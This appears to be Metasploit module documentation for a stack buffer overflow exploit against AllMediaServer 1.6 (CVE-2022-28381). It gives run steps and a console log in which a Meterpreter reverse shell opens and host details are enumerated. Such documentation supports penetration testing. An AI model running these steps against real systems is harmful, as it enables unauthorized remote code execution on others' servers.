## Vulnerable Application

AllMediaServer 1.6 and prior is vulnerable to a stack buffer overflow resulting in a SEH handler overwrite when sending an
overly long TCP request to the listening server, which runs on port 888 by default. By controlling this buffer overflow,
an attacker can overwrite the SEH exception handler and abuse the exception handling mechanism to gain RCE on the target
server as the user running AllMediaServer 1.6.

This exploit has been confirmed to work on x86 systems as well as on WoW64 systems, however it will not work against x64
systems due to the fact that they have a different way of implementing exception handling.

## Verification Steps
1. `use exploit/windows/misc/cve_2022_28381_allmediaserver_bof`
1. Set `RHOSTS` to the target IP address or addresses.
1. Optional: Set `RPORT` to the port of AllMediaServer if it has changed.
1. Set payload options as appropriate.
1. `exploit`
1. Verify you get a new shell as the user running AllMediaServer.

## Options

## Scenarios

### Windows 10 10.0.19043.1586 with AllMediaServer 1.6
```
msf6 payload(windows/x64/meterpreter/reverse_tcp) > use exploit/windows/misc/cve_2022_28381_allmediaserver_bof
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/cve_2022_28381_allmediaserver_bof) > show options

Module options (exploit/windows/misc/cve_2022_28381_allmediaserver_bof):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo
                                      it
   RPORT   888              yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.26.241.162   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ALLMediaServer 1.6


msf6 exploit(windows/misc/cve_2022_28381_allmediaserver_bof) > set RHOSTS 172.26.251.245
RHOSTS => 172.26.251.245
msf6 exploit(windows/misc/cve_2022_28381_allmediaserver_bof) > set LHOST 172.26.241.162
LHOST => 172.26.241.162
msf6 exploit(windows/misc/cve_2022_28381_allmediaserver_bof) > exploit

[*] Started reverse TCP handler on 172.26.241.162:4444
[*] 172.26.251.245:888 - Sending payload to exploit MediaServer...
[*] 172.26.251.245:888 - Sent payload...hopefully we should get a shell!
[*] Sending stage (175174 bytes) to 172.26.251.245
[*] Meterpreter session 1 opened (172.26.241.162:4444 -> 172.26.251.245:50285 ) at 2022-04-04 10:50:22 -0500

meterpreter > getuid
Server username: DESKTOP-JLPENJ2\admin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > sysinfo
Computer        : DESKTOP-JLPENJ2
OS              : Windows 10 (10.0 Build 19043).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 4
Meterpreter     : x86/windows
meterpreter > exit
```
